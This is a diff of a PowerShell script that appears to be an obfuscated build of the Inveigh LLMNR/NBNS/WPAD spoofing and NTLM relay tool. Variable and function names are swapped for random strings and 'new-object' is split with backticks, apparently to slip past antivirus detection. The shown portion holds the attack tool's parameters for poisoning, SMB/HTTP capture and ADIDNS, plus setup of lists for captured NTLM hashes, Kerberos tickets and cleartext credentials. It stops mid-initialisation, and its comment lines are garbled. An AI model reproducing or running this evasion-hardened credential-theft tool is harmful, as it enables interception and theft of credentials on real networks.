@@ -1,4 +1,4 @@
-function Invoke-LightOval
+function Invoke-sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV
 {
 
 # Microsoft".
@@ -7,450 +7,450 @@ function Invoke-LightOval
 [CmdletBinding()]
 param
 ( 
-    [parameter(Mandatory=$false)][Array]$LiveSedate = ("isatap","wpad"),
-    [parameter(Mandatory=$false)][Array]$OrangeDog = "",
-    [parameter(Mandatory=$false)][Array]$ExpandNest = "Firefox",
-    [parameter(Mandatory=$false)][Array]$BreezyDesign = ("139","445"),
-    [parameter(Mandatory=$false)][Array]$FairAblaze = "",
-    [parameter(Mandatory=$false)][Array]$BikeLoud = "",
-    [parameter(Mandatory=$false)][Array]$HoleRoute = "",
-    [parameter(Mandatory=$false)][Array]$WoozyClose = "",
-    [parameter(Mandatory=$false)][Array]$ObeyAttack = "",
-    [parameter(Mandatory=$false)][Array]$RecordRobust = "",
-    [parameter(Mandatory=$false)][Array]$RobustFail = "Firefox",
-    [parameter(Mandatory=$false)][Int]$FailDad = "-1",
-    [parameter(Mandatory=$false)][Int]$CycleLovely = "",
-    [parameter(Mandatory=$false)][Int]$IceFix = "4",
-    [parameter(Mandatory=$false)][Int]$FarDry = "600",
-    [parameter(Mandatory=$false)][Int]$HandsHop = "30",
-    [parameter(Mandatory=$false)][Int]$LunchCheat = "80",
-    [parameter(Mandatory=$false)][Int]$HarmFruit = "443",
-    [parameter(Mandatory=$false)][Int]$KindLick = "2",
-    [parameter(Mandatory=$false)][Int]$TeaseNasty = "30",
-    [parameter(Mandatory=$false)][Int]$MurderOffer = "120",
-    [parameter(Mandatory=$false)][Int]$BlushCattle = "165",
-    [parameter(Mandatory=$false)][Int]$MournMean = "",
-    [parameter(Mandatory=$false)][Int]$OafishAllow = "8492",
-    [parameter(Mandatory=$false)][Int]$MatterOffice = "",
-    [parameter(Mandatory=$false)][Int]$GrowthWind = "",
-    [parameter(Mandatory=$false)][Int]$RuralOpen = "",
-    [parameter(Mandatory=$false)][Int]$SmokeFang = "",
-    [parameter(Mandatory=$false)][Int]$WrongAnts = "30",
-    [parameter(Mandatory=$false)][Int]$OwnBump = "0",
-    [parameter(Mandatory=$false)][Int]$SameSneaky = "0",
-    [parameter(Mandatory=$false)][String]$TrapJoin = "",
-    [parameter(Mandatory=$false)][String]$KnownFood = "",
-    [parameter(Mandatory=$false)][String]$StoryFurry = "",
-    [parameter(Mandatory=$false)][String]$BouncyEven = "wpad",
-    [parameter(Mandatory=$false)][String]$ShinyAunt = "wpad2",
-    [parameter(Mandatory=$false)][String]$FullGrin = "",
-    [parameter(Mandatory=$false)][String]$SuperbBlood = "ADFS",
-    [parameter(Mandatory=$false)][String]$SwingHorses = "text/html",
-    [parameter(Mandatory=$false)][String]$StewLean = "",
-    [parameter(Mandatory=$false)][String]$BadgeKind = "",
-    [parameter(Mandatory=$false)][String]$YawnOdd = "",
-    [parameter(Mandatory=$false)][String]$PiesWound = "Inveigh",
-    [parameter(Mandatory=$false)][String]$FetchRobust = "localhost",
-    [parameter(Mandatory=$false)][String]$DelayValue = "WPAD",
-    [parameter(Mandatory=$false)][String]$ReasonTrust = "function FindProxyForURL(url,host){return `"DIRECT`";}",
-    [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][String]$HeavySmall = "",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$EscapeArch = "Y",
-    [parameter(Mandatory=$false)][ValidateSet("Combo","NS","Wildcard")][Array]$TourManage,
-    [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones","System")][String]$ViewNice = "DomainDNSZones",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HeatIll = "Y",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$CuteGroup = "Y",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HomelyShow = "Y",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$BootShrill = "Y",
+    [parameter(Mandatory=$false)][Array]$UOzMMsyJArPmhisyLVaGMsjMfqvxxPEEqcCGGGiDZcZ = ("isatap","wpad"),
+    [parameter(Mandatory=$false)][Array]$jSRJtPliVOZcEheIvIfSdzZkyexraLCnkoMNKC = "",
+    [parameter(Mandatory=$false)][Array]$eHhdMzJITQkHvLFvGvuaGszuwtoKkVctXVaSotDPalR = "Firefox",
+    [parameter(Mandatory=$false)][Array]$xiTnjmjZESCjsSHBdSaGp = ("139","445"),
+    [parameter(Mandatory=$false)][Array]$NJquQJdotFLnYRzmvZcDDMgYuxhLWvmllbBNpsWFnKORo = "",
+    [parameter(Mandatory=$false)][Array]$EPlJedBuToZfupQVQRyNJcsGRdsiyc = "",
+    [parameter(Mandatory=$false)][Array]$fASVUOYmrApOtQBmKFuEovhUMlVuanUGYXvQMnoGTxjXo = "",
+    [parameter(Mandatory=$false)][Array]$swtccPhWthPrfRuqcBjGDBsGzLJxpUPliCqsEYyFZFe = "",
+    [parameter(Mandatory=$false)][Array]$GeJSNuMkVuobUeQRhIVNdNxEwPrMoNg = "",
+    [parameter(Mandatory=$false)][Array]$ADiwJnNZnMBGnMVXtwvUpdIB = "",
+    [parameter(Mandatory=$false)][Array]$LBwGGAkoRuUTfNJopnGziYvEpsmlXdMTqzqc = "Firefox",
+    [parameter(Mandatory=$false)][Int]$futRGbdymzbIAOSHtlviC = "-1",
+    [parameter(Mandatory=$false)][Int]$WTwPWDshnKDcBRTCcwgFtZhPkAvsjVqmrtn = "",
+    [parameter(Mandatory=$false)][Int]$HrZcGMZkGIqzkfsIOcryPlOaGnDRdnbAQIgw = "4",
+    [parameter(Mandatory=$false)][Int]$EishpmLeabgtsVFwpBjSiSwYdQOFqXys = "600",
+    [parameter(Mandatory=$false)][Int]$uJYtaPKHBkqYNTkyQSeECcLBxVkiaeVYMOZmxVHhhl = "30",
+    [parameter(Mandatory=$false)][Int]$LwDfsPrfdttvoEsdSBgdEUwjBXpltVybimvJb = "80",
+    [parameter(Mandatory=$false)][Int]$ebIBhGGOpbSBFXWqVDkNgnIkDLxkcIi = "443",
+    [parameter(Mandatory=$false)][Int]$JoXWcoXEYHNGuWREHpaUFbcXY = "2",
+    [parameter(Mandatory=$false)][Int]$UdYfMnaGXJWMXhxYZmYdzwcmAzjlyonIBluDRRRurFD = "30",
+    [parameter(Mandatory=$false)][Int]$LvtxlyiEnOfiOybKhfWwKTUJzJGquSXviBRRk = "120",
+    [parameter(Mandatory=$false)][Int]$fgjekbNhYQKGsQdqOkUhuYvojUQK = "165",
+    [parameter(Mandatory=$false)][Int]$NRfqdntsPZobtiOhhrmgkqIltwHFxMIQcgwzNxjPu = "",
+    [parameter(Mandatory=$false)][Int]$uVKWZlyRdsxhxHZhEhpVHaVYWFrjLZNRwXVHZiokBazh = "8492",
+    [parameter(Mandatory=$false)][Int]$KndapymywThkYKAxqdcJDIReOUkholHuQAHkNlCjcX = "",
+    [parameter(Mandatory=$false)][Int]$PHCBkumExoZsaamTxeZRDLT = "",
+    [parameter(Mandatory=$false)][Int]$IYAYGqRLLvHcDtnlfCDQT = "",
+    [parameter(Mandatory=$false)][Int]$TUiftddccfYQxZeoLdwPKCLKmdiXZImsjJoICXnLErAY = "",
+    [parameter(Mandatory=$false)][Int]$eEmdEINEKedVTvUFZHbuolOJMVn = "30",
+    [parameter(Mandatory=$false)][Int]$wDCFDGIoGZceCUiHjkwAZDQXJJNKhHkWrGexcePVDeWCz = "0",
+    [parameter(Mandatory=$false)][Int]$DdjubLRjwAypaYSppdSjdNWWgjtwdcxUchRdcyC = "0",
+    [parameter(Mandatory=$false)][String]$NuKysEWfwHfjXVFRVZPgsYOxkAnIFj = "",
+    [parameter(Mandatory=$false)][String]$XUZlETEKoZKWHdmmfbBJczSphZSZBDSdIxXzDCCaAERO = "",
+    [parameter(Mandatory=$false)][String]$uMFJurNQLlKXHMAtZAvWpotfqfIjJctkCymHxbpcYbcoz = "",
+    [parameter(Mandatory=$false)][String]$mUfKHWVntBnTLNKQYEtLBIaCAkwKF = "wpad",
+    [parameter(Mandatory=$false)][String]$IhJmgwPnhtuPfSfJnHIiUD = "wpad2",
+    [parameter(Mandatory=$false)][String]$IthkijDWNkzEdhZAgWnlnNzsByVFDrWjDLQzbE = "",
+    [parameter(Mandatory=$false)][String]$KkTbrgewekSBhNviJsMfTclAsOTAazQqLRRlNQY = "ADFS",
+    [parameter(Mandatory=$false)][String]$GqExLUpPHBnrxIigVOcPUZyEfogVhxNbREMxfzIAcS = "text/html",
+    [parameter(Mandatory=$false)][String]$lPdyiYkNubAdzFDDAVCwBwpJsVNHasQHppbgl = "",
+    [parameter(Mandatory=$false)][String]$mxyeWmucysuQaCQWfngETzsqqbNiqa = "",
+    [parameter(Mandatory=$false)][String]$obcRRswvZXEpdnVKmVqxjHfaEIVMDzeLYwwAE = "",
+    [parameter(Mandatory=$false)][String]$EErIkmTcFOBpNMZRrqyGdNmGPVkzXmrWpR = "Inveigh",
+    [parameter(Mandatory=$false)][String]$TGOAomhHojpzXwSrFynUOBqOLMyHoxZJoSG = "localhost",
+    [parameter(Mandatory=$false)][String]$WfbavDNzjNgDFDUYWZEYjga = "WPAD",
+    [parameter(Mandatory=$false)][String]$aWWNkGgRqzQWHhdZkUzqbTdql = "function FindProxyForURL(url,host){return `"DIRECT`";}",
+    [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][String]$xUlvMGNvOmaODuSVmfwndiKyNJVQvZCjtHWjFUWcWmBU = "",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ZUaLdqsdrhxWmJEfQKCHDLyHiaEIyXowcmqOUahE = "Y",
+    [parameter(Mandatory=$false)][ValidateSet("Combo","NS","Wildcard")][Array]$LKZKomsGsEUsPOllMavnB,
+    [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones","System")][String]$BFlwqVfFgHmnWSTrqOBa = "DomainDNSZones",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$hfdTDJMIWbkWdkyrTVXeElGpVPakhrijbMLWgef = "Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$NcOuDYrPMCFkGAkGVeXkawbkHNSRTshpDrpJvCbYEvB = "Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$tPEylzZKZOmcrNuZqaNvxfEfrUAkL = "Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$aIowrpuHkOxENKSShZvEwCIJzxVgFyNLYKmALixgLNWyk = "Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$FileOutput = "N",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$FileUnique = "Y",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ChargeClap = "Y",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SourBottle = "N",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SomberBang = "N",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HeapDetect = "N",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$LipMeat = "Y",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$WhiteNote = "Y",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ShinyUppity = "N",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$BoilClever = "N",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$PeckFirst = "N",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SeaEarth = "N",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$NoticeLiquid = "N",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$JumpyWrench = "N",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$DollHead = "Y",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$NorthAmuck = "Y",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$PlugTour = "N",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$JokeFaulty = "Y",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$RelyNotice = "Y",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HoverMug = "Y",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ShopStop = "N",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N","Low","Medium")][String]$RottenBed = "N",
-    [parameter(Mandatory=$false)][ValidateSet("Auto","Y","N")][String]$LinenTrick = "Auto",
-    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM","NTLMNoESS")][String]$SkirtStone = "NTLM",
-    [parameter(Mandatory=$false)][ValidateSet("QU","QM")][Array]$WantLittle = @("QU"),
-    [parameter(Mandatory=$false)][ValidateSet("00","03","20","1B","1C","1D","1E")][Array]$ThawMiddle = @("00","20"),
-    [parameter(Mandatory=$false)][ValidateSet("File","Memory")][String]$SlimyCable = "",
-    [parameter(Mandatory=$false)][ValidateSet("Basic","NTLM","NTLMNoESS")][String]$LightDesign = "NTLM",
-    [parameter(Mandatory=$false)][ValidateSet("0","1","2")][String]$BaseBright = "0",
-    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM","NTLMNoESS")][String]$LoadTrade = "NTLM",
-    [parameter(Mandatory=$false)][ValidateScript({$_.Length -eq 64})][String]$LearnHelp,
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$XQYPwdDHgZKeoLOpHQUhQCuNLwfmtOFbrxtKDcERAyxo = "Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$zXuJKxMkcdZHqkkVbrPql = "N",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$UXowvKKBiUoyaSPmKbFYELYqtZAjHUFvODVoHzqGDCPea = "N",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$fanhQcOeQBmoBotjLVUmvltLESsAfwuewvn = "N",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$PFkUZTrIToIoyXaKEeXORSPy = "Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$jjFnwMjlUxGLCApPYzLoDktsIGYjfDUqWDUXDZ = "Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$mwNkwDoBRXQQARPqtqrnqckGKqSYpseblGNrGPTZyPo = "N",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$QdOGoORVrhoEArPgHPqrqy = "N",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$FgNBtZxZNMexFHUNkQWMnvvJvIQQotCEGqezQiWxHPbO = "N",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$POSxdOOZVTyYRayFSuOkyqkjOdwHvYEdfwrlikHIsVD = "N",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$osUTjytCcqukfNwUTFmGbOOpoKFGWaleocLbR = "N",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$QwSMzXPWnDpEnfpPpksOdTKwwVNMJkIdZB = "N",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$qbmBmJvYTsbYUvEKbqNCbOv = "Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$UgjMonOdclnvuXTUStjJPlyfcIaSHwykwOJbBB = "Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$LPmXJzyXqTgdUoElyxFCYzOJzqmSu = "N",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$iNyWtiQGdKJEvnLZUaOj = "Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$lzXAGMLDOOrGvWxwWmxfIHRXsfHWfGmxgFVMLvbS = "Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$GFEiVoeWYTuTqJUBiwnTtkzbJfXbddMLJZPAJ = "Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$eSkNEpnnSUnlgKfPeoyUkoUgMDg = "N",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N","Low","Medium")][String]$lkPcWVVpLUCgsOzshxhpoRVCsIGIIciiEFTOCbSPYBG = "N",
+    [parameter(Mandatory=$false)][ValidateSet("Auto","Y","N")][String]$RiBdtbrsRvAOaKjORUfNDsWCGnrqvTECqlDxhyr = "Auto",
+    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM","NTLMNoESS")][String]$SKVFmrXEfBIfxjyvDecjFzVZvkyOhdiApBpgWeXKPiyP = "NTLM",
+    [parameter(Mandatory=$false)][ValidateSet("QU","QM")][Array]$oiEknJevzfgMBjSqYIpc = @("QU"),
+    [parameter(Mandatory=$false)][ValidateSet("00","03","20","1B","1C","1D","1E")][Array]$XhwellVoTKeVMVnjDxSPEtBaYbtZbnzznVRtpfqiMxZZ = @("00","20"),
+    [parameter(Mandatory=$false)][ValidateSet("File","Memory")][String]$QXplYkjxeRFAgTbHwoZGdRyj = "",
+    [parameter(Mandatory=$false)][ValidateSet("Basic","NTLM","NTLMNoESS")][String]$HvUqFOMXgTONLjKfDZYefWFgo = "NTLM",
+    [parameter(Mandatory=$false)][ValidateSet("0","1","2")][String]$hGjKncthoprHSEMgsWUxrXKWoBIZybkBY = "0",
+    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM","NTLMNoESS")][String]$QHapxkBOzdGDgKrNpoGOOUOrxeHqddKnclM = "NTLM",
+    [parameter(Mandatory=$false)][ValidateScript({$_.Length -eq 64})][String]$HmzaQTfoETMMBLLoFthmsnPeudAqyQhk,
     [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$FileOutputDirectory = "",
-    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$YummyShame = "",
-    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$RightSnail = "0.0.0.0",
-    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$SmashDolls = "",
-    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$NorthLumpy = "",
-    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$PreachBad = "0.0.0.0",
-    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$StickLame = "",
-    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$PlayIdea = "",
-    [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$BlackFilthy,
-    [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$MilkyCelery,
-    [parameter(Mandatory=$false)][Switch]$MeekSmoggy,
-    [parameter(ValueFromRemainingArguments=$true)]$TongueShrug
+    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$MslTACztzyXoaKHvwDiYETatjVpozshBYotjqUR = "",
+    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$JWYgYLitWgWEMqXjWtRtTtWTbdhYvXBLGSKZGfyA = "0.0.0.0",
+    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS = "",
+    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$deBQuAjyapQghIWyxSkbGMUVBhWkEQTObsvCP = "",
+    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$uyfyGXdurVEEVxvRILOlr = "0.0.0.0",
+    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$zkTvnUBoWamaHbrMDvklWqGBdwC = "",
+    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$voOnItKiZuDTGcbpsxtqAbz = "",
+    [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$ssnImzbkFylCcfywIEEVBwc,
+    [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$MzEtrLTVqEtcWOHYZYMMuVcUPHPAjDcOANSdrVCoRiWho,
+    [parameter(Mandatory=$false)][Switch]$ljmosEibVSNBPotWNpujNBqreoZueTjDFsfrajowAsCn,
+    [parameter(ValueFromRemainingArguments=$true)]$jpNTCIxGJBVtjEdXzPhc
 )
 
 # Microsoft".
 # Microsoft".
-if($TongueShrug)
+if($jpNTCIxGJBVtjEdXzPhc)
 {
-    Write-TableSteam "[-] $($TongueShrug) is not a valid parameter"
+    Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[-] $($jpNTCIxGJBVtjEdXzPhc) is not a valid parameter"
     throw
 }
 
-$WoolSnails = "1.506"
+$besbIZCENYbZaNorwgElwSZvHakWRXW = "1.506"
 
-if(!$SmashDolls)
+if(!$vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS)
 { 
 
     try
     {
-        $SmashDolls = (Test-RoundFace 127.0.0.1 -count 1 | Select-Object -ExpandProperty Ipv4Address)
+        $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS = (Test-CwrpxaEqOLQsinsCiWWEtjTmPBGUOYFOeSHdoj 127.0.0.1 -count 1 | Select-Object -ExpandProperty Ipv4Address)
     }
     catch
     {
-        Write-TableSteam "[-] Error finding local IP, specify manually with -SmashDolls"
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[-] Error finding local IP, specify manually with -vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS"
         throw
     }
 
 }
 
-if(!$StickLame)
+if(!$zkTvnUBoWamaHbrMDvklWqGBdwC)
 {
-    $StickLame = $SmashDolls
+    $zkTvnUBoWamaHbrMDvklWqGBdwC = $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS
 }
 
-if($TourManage)
+if($LKZKomsGsEUsPOllMavnB)
 {
 
-    if(!$KnownFood -or !$TrapJoin -or $StoryFurry -or !$FullGrin)
+    if(!$XUZlETEKoZKWHdmmfbBJczSphZSZBDSdIxXzDCCaAERO -or !$NuKysEWfwHfjXVFRVZPgsYOxkAnIFj -or $uMFJurNQLlKXHMAtZAvWpotfqfIjJctkCymHxbpcYbcoz -or !$IthkijDWNkzEdhZAgWnlnNzsByVFDrWjDLQzbE)
     {
 
         try
         {
-            $DapperHurry = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+            $bzXZXSuHAoifXdglpUaBAaOkFenzX = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
         }
         catch
         {
-            Write-TableSteam "[-] $($_.Exception.Message)"
+            Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[-] $($_.Exception.Message)"
             throw
         }
 
-        if(!$KnownFood)
+        if(!$XUZlETEKoZKWHdmmfbBJczSphZSZBDSdIxXzDCCaAERO)
         {
-            $KnownFood = $DapperHurry.PdcRoleOwner.Name
+            $XUZlETEKoZKWHdmmfbBJczSphZSZBDSdIxXzDCCaAERO = $bzXZXSuHAoifXdglpUaBAaOkFenzX.PdcRoleOwner.Name
         }
     
-        if(!$TrapJoin)
+        if(!$NuKysEWfwHfjXVFRVZPgsYOxkAnIFj)
         {
-            $TrapJoin = $DapperHurry.Name
+            $NuKysEWfwHfjXVFRVZPgsYOxkAnIFj = $bzXZXSuHAoifXdglpUaBAaOkFenzX.Name
         }
 
-        if(!$StoryFurry)
+        if(!$uMFJurNQLlKXHMAtZAvWpotfqfIjJctkCymHxbpcYbcoz)
         {
-            $StoryFurry = $DapperHurry.Forest
+            $uMFJurNQLlKXHMAtZAvWpotfqfIjJctkCymHxbpcYbcoz = $bzXZXSuHAoifXdglpUaBAaOkFenzX.Forest
         }
     
-        if(!$FullGrin)
+        if(!$IthkijDWNkzEdhZAgWnlnNzsByVFDrWjDLQzbE)
         {
-            $FullGrin = $DapperHurry.Name
+            $IthkijDWNkzEdhZAgWnlnNzsByVFDrWjDLQzbE = $bzXZXSuHAoifXdglpUaBAaOkFenzX.Name
         }
 
     }
 
 }
 
-if($StewLean -or $BadgeKind)
+if($lPdyiYkNubAdzFDDAVCwBwpJsVNHasQHppbgl -or $mxyeWmucysuQaCQWfngETzsqqbNiqa)
 {
 
-    if(!$YummyShame)
+    if(!$MslTACztzyXoaKHvwDiYETatjVpozshBYotjqUR)
     {
-        Write-TableSteam "[-] You must specify an -HTTPDir when using either -StewLean or -BadgeKind"
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[-] You must specify an -HTTPDir when using either -lPdyiYkNubAdzFDDAVCwBwpJsVNHasQHppbgl or -mxyeWmucysuQaCQWfngETzsqqbNiqa"
         throw
     }
 
 }
 
-if($HeapDetect -eq 'Y' -and !$MilkyCelery -and !$LearnHelp)
+if($fanhQcOeQBmoBotjLVUmvltLESsAfwuewvn -eq 'Y' -and !$MzEtrLTVqEtcWOHYZYMMuVcUPHPAjDcOANSdrVCoRiWho -and !$HmzaQTfoETMMBLLoFthmsnPeudAqyQhk)
 {
-    Write-TableSteam "[-] You must specify a -MilkyCelery or -LearnHelp when enabling Kerberos capture"
+    Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[-] You must specify a -MzEtrLTVqEtcWOHYZYMMuVcUPHPAjDcOANSdrVCoRiWho or -HmzaQTfoETMMBLLoFthmsnPeudAqyQhk when enabling Kerberos capture"
     throw
 }
 
-if($PlayIdea -or $RuralOpen)
+if($voOnItKiZuDTGcbpsxtqAbz -or $IYAYGqRLLvHcDtnlfCDQT)
 {
 
-    if(!$PlayIdea)
+    if(!$voOnItKiZuDTGcbpsxtqAbz)
     {
-        Write-TableSteam "[-] You must specify a -RuralOpen to go with -PlayIdea"
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[-] You must specify a -IYAYGqRLLvHcDtnlfCDQT to go with -voOnItKiZuDTGcbpsxtqAbz"
         throw
     }
 
-    if(!$RuralOpen)
+    if(!$IYAYGqRLLvHcDtnlfCDQT)
     {
-        Write-TableSteam "[-] You must specify a -PlayIdea to go with -RuralOpen"
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[-] You must specify a -voOnItKiZuDTGcbpsxtqAbz to go with -IYAYGqRLLvHcDtnlfCDQT"
         throw
     }
 
 }
 
-if($SeaEarth -eq 'Y' -and !$NorthLumpy)
+if($POSxdOOZVTyYRayFSuOkyqkjOdwHvYEdfwrlikHIsVD -eq 'Y' -and !$deBQuAjyapQghIWyxSkbGMUVBhWkEQTObsvCP)
 {
-    Write-TableSteam "[-] You must specify a -NorthLumpy if enabling -SeaEarth"
+    Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[-] You must specify a -deBQuAjyapQghIWyxSkbGMUVBhWkEQTObsvCP if enabling -POSxdOOZVTyYRayFSuOkyqkjOdwHvYEdfwrlikHIsVD"
     throw
 }
 
 if(!$FileOutputDirectory)
 { 
-    $SilkySmelly = $TemptWarn.Path
+    $NEfQfhYIiNOOsRWGcSaBKnaQpZTkphwGrbcV = $jQolrjmjSXAQpcwXswtsCuUdGcUiudtRUU.Path
 }
 else
 {
-    $SilkySmelly = $FileOutputDirectory
+    $NEfQfhYIiNOOsRWGcSaBKnaQpZTkphwGrbcV = $FileOutputDirectory
 }
 
-if(!$LightOval)
+if(!$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV)
 {
-    $GrinFamous:inveigh = [HashTable]::Synchronized(@{})
-    $LightOval.cleartext_list = ne`w-`obje`ct System.Collections.ArrayList
-    $LightOval.enumerate = ne`w-`obje`ct System.Collections.ArrayList
-    $LightOval.IP_capture_list = ne`w-`obje`ct System.Collections.ArrayList
-    $LightOval.log = ne`w-`obje`ct System.Collections.ArrayList
-    $LightOval.kerberos_TGT_list = ne`w-`obje`ct System.Collections.ArrayList
-    $LightOval.kerberos_TGT_username_list = ne`w-`obje`ct System.Collections.ArrayList
-    $LightOval.NTLMv1_list = ne`w-`obje`ct System.Collections.ArrayList
-    $LightOval.NTLMv1_username_list = ne`w-`obje`ct System.Collections.ArrayList
-    $LightOval.NTLMv2_list = ne`w-`obje`ct System.Collections.ArrayList
-    $LightOval.NTLMv2_username_list = ne`w-`obje`ct System.Collections.ArrayList
-    $LightOval.POST_request_list = ne`w-`obje`ct System.Collections.ArrayList
-    $LightOval.valid_host_list = ne`w-`obje`ct System.Collections.ArrayList
-    $LightOval.ADIDNS_table = [HashTable]::Synchronized(@{})
-    $LightOval.relay_privilege_table = [HashTable]::Synchronized(@{})
-    $LightOval.relay_failed_login_table = [HashTable]::Synchronized(@{})
-    $LightOval.relay_history_table = [HashTable]::Synchronized(@{})
-    $LightOval.request_table = [HashTable]::Synchronized(@{})
-    $LightOval.session_socket_table = [HashTable]::Synchronized(@{})
-    $LightOval.session_table = [HashTable]::Synchronized(@{})
-    $LightOval.session_message_ID_table = [HashTable]::Synchronized(@{})
-    $LightOval.session_lock_table = [HashTable]::Synchronized(@{})
-    $LightOval.SMB_session_table = [HashTable]::Synchronized(@{})
-    $LightOval.domain_mapping_table = [HashTable]::Synchronized(@{})
-    $LightOval.group_table = [HashTable]::Synchronized(@{})
-    $LightOval.session_count = 0
-    $LightOval.session = @()
+    $QZbkvlGuewysOdhCIJnQjltIeAnXPtmllETBJtmd:inveigh = [HashTable]::Synchronized(@{})
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.cleartext_list = ne`w`-`ob`je`ct System.Collections.ArrayList
